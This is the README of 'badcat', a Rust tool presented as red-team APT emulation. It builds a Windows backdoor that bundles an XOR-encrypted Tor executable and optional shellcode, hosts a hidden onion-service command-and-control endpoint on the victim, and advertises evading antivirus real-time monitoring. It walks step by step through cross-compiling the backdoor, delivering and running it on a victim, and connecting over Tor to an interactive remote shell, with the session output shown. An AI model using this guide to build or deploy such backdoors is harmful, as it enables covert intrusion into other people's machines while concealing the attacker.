# badcat

This a tool intended to be used by Red Teams, in order to mimic APT ([Advanced Persistent Threat](https://csrc.nist.gov/glossary/term/advanced_persistent_threat)) attacks. It hides the C2 ([Command and Control](https://csrc.nist.gov/glossary/term/C2)) server by using [Onion Services](https://community.torproject.org/onion-services/overview/) to masquerade attacker's real IP address.

# Glossary
_attacker_: conductor of the attack.

_victim_: the target machine of the attack.

_backdoor_: executable generated by the _attacker_ and delivered to _victim_.

_server_: _backdoor_ running Tor Onion Service on the _victim_.

# Features

1. Bundle Tor executable inside the _backdoor_.
2. Automatic Onion Service configuration using a configurable torrc template.
3. Authentication to access the _server_.
4. Optional use of payload (aka shellcode) in the _backdoor_, which is only executed once the attacker connects evading any AV real time monitoring. When not using a payload, fallback to badcat's basic shell.
5. XOR encryption of embedded Tor executable and payload.
6. Full [rust](https://www.rust-lang.org/) source code.

# Alternatives

So far I have only found [ToRat](https://github.com/lu4p/ToRat) as a good alternative.

## ToRat

ToRat is a Remote Administration tool using Tor as a transport mechanism and RPC for communication. There are conceptual differences between badcat and ToRat. The former focuses at creating an environment for shipping an anonymous backdoor  with user adaptable payload. On the other hand, ToRat tries to be an All-In-One solution, featuring among other things, util commands via RPC, cross-platform and multi-user persistence, code obfuscation.

The big advantage of badcat compared to ToRat is the way it uses the Onion Service. Differently than ToRat, the server starts in the client and the attacker connects to the server, using the bind tcp approach. The main reason for this is convinience, because the attacker never needs to worry about keeping a server up and running, and by that I mean, secured, with log-rotation and backups. One other argument - although as far as I know nothing confirm that - it's that the attack surface to deanonymize an Onion Service is in a higher degree than to deanonymize a common Tor user.

# Getting Started

## Install Rust

1. Follow the instructions to install `rustup` tool: https://www.rust-lang.org/tools/install.
Select the default installation. Rustup prepares your environment for cross-compilation and dependency management using `cargo`.

```bash
...

    stable-x86_64-unknown-linux-gnu installed - rustc 1.56.1 (59eed8a2a 2021-11-01)


Rust is installed now. Great!

To get started you may need to restart your current shell.
This would reload your PATH environment variable to include
Cargo's bin directory ($HOME/.cargo/bin).

To configure your current shell, run:
source $HOME/.cargo/env
```

Now restart your shell or execute the mentioned command above to configure your shell.
With the configured shell, run the following command to ensure `rustup` was installed with success:

```bash
$ rustup --version
rustup 1.24.3 (ce5817a94 2021-05-31)
info: This is the version for the rustup toolchain manager, not the rustc compiler.
info: The currently active `rustc` version is `rustc 1.56.1 (59eed8a2a 2021-11-01)`
```

2. For configuring the Onion Service we need a tool for generating the hostname and the private key, for this badcat uses `mkp224o`. Follow the instructions to generate the binary https://github.com/cathugger/mkp224o#mkp224o---vanity-address-generator-for-ed25519-onion-services.

After you have compile `mkp224o` add the binary to your `PATH` environment, so badcat is able to call it. Ensure `mkp224o` is discoverable by your shell with:

```bash
$ which mkp224o
/home/myuser/.local/bin/mkp224o
```

## Simple Quick Usage

This quick example shows how to generate the _backdoor_ for a Windows x64 machine using Fedora (Linux). Let's breakdown the steps to gain remote command execution into 4 steps.

1. Compile the attacker toolkit once.

The attacker toolkit is used to access _victim_'s computer through the backdoor, you are able to use it anywhere as long as you have the hosts file. The hosts file describes each of your _victim_ and how to get in touch with them.

```bash
$ cargo build --release -p attacker
```

The executable is at `target/release/attacker`.

2. Install Windows cross-compilation toolchain. 

We need to configure `rust` to target the Windows host.

```bash
$ rustup target add x86_64-pc-windows-gnu
$ rustup toolchain install stable-x86_64-pc-windows-gnu
error: DEPRECATED: future versions of rustup will require --force-non-host to install a non-host toolchain as the default.
warning: toolchain 'stable-x86_64-pc-windows-gnu' may not be able to run on this system.
warning: If you meant to build software to target that platform, perhaps try `rustup target add x86_64-pc-windows-gnu` instead?
info: syncing channel updates for 'stable-x86_64-pc-windows-gnu'
info: latest update on 2021-11-01, rust version 1.56.1 (59eed8a2a 2021-11-01)
info: downloading component 'cargo'
info: downloading component 'clippy'
info: downloading component 'rust-docs'
info: downloading component 'rust-mingw'
info: downloading component 'rust-std'
info: downloading component 'rustc'
info: downloading component 'rustfmt'
info: installing component 'cargo'
info: installing component 'clippy'
info: installing component 'rust-docs'
 17.2 MiB /  17.2 MiB (100 %)   1.7 MiB/s in  8s ETA:  0s
info: installing component 'rust-mingw'
info: installing component 'rust-std'
 31.4 MiB /  31.4 MiB (100 %)   9.7 MiB/s in  3s ETA:  0s
info: installing component 'rustc'
135.2 MiB / 135.2 MiB (100 %)   8.1 MiB/s in 16s ETA:  0s
info: installing component 'rustfmt'
  6.2 MiB /   6.2 MiB (100 %)   6.2 MiB/s in  1s ETA:  0s

  stable-x86_64-pc-windows-gnu installed - (rustc does not exist)

info: checking for self-updates
```

The two commands above may take a few minutes to complete.

There are two last components to install, the [Mingw](https://www.mingw-w64.org/) GCC compiler and `pthread` static libraries. Lookup how to install `Mingw` and `pthread` for your Operating System, remember that we are targeting `win64`. Hint, on Fedora the package name is `mingw64-gcc` and `mingw64-winpthreads-static`, respectively.

Then ensure it's fully configured running:

```bash
$ x86_64-w64-mingw32-gcc --version
x86_64-w64-mingw32-gcc (GCC) 10.3.1 20210422 (Fedora MinGW 10.3.1-2.fc33)
Copyright (C) 2020 Free Software Foundation, Inc.
This is free software; see the source for copying conditions.  There is NO
warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
```

The version shown may be different than yours.

3. Build the _backdoor_ for Windows. 

Finally we are able to compile the _backdoor_. Every time you build a _backdoor_, badcat reads a configuration file with instructions. This configuration file must be at `victim/settings.json` but it's intended to be per-installation, so there is an example file at `victim/settings.json.example`. 

Once you have created the configuration from the example, we are done to build the _backdoor_ using the default configurations, which are the following:

- badcat's basic shell
- Tor executable directly from The Tor Project, which - unfortunately - is compiled to open a Windows console by default.

Build the _backdoor_ targeting Windows x64:

```bash
$ cargo build -p victim --release --target=x86_64-pc-windows-gnu
```

Once completed, check the result file:

```bash
$ file target/x86_64-pc-windows-gnu/release/victim.exe
target/x86_64-pc-windows-gnu/release/victim.exe: PE32+ executable (GUI) x86-64, for MS Windows
```

That seems fine. You may now had noticed that a new file called `hosts.json` was created. This is the configuration file used to connect to the _victim_ using the attacker toolkit.

4. Delivery and Control.

Deliver the generated executable to the _victim_ and execute.


IMAGE

Configure Tor at your attacker machine and connect to the victim through the attacker toolkit.

```bash
$ ./attacker -f hosts.json
Badcat attacker toolkit. Connect to your hosts
Type help for commands.

# list
0 my-dev-badcat test false  a5w42o
# connect 0
trying to connect (attempt 0)...
connected to: Ip(0.0.0.0:0)
opening the default badcat shell...

note: when you exit the shell, keep pressing Enter until it exits



Microsoft Windows [Version 10.0.19043.928]
(c) Microsoft Corporation. All rights reserved.

C:\Users\User\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is FC95-D1E1

 Directory of C:\Users\User\Desktop

11/25/2021  11:10 AM    <DIR>          .
11/25/2021  11:10 AM    <DIR>          ..
11/24/2021  11:30 PM        27,995,815 victim.exe
               1 File(s)     27,995,815 bytes
               2 Dir(s)     351,571,968 bytes free

C:\Users\User\Desktop>
```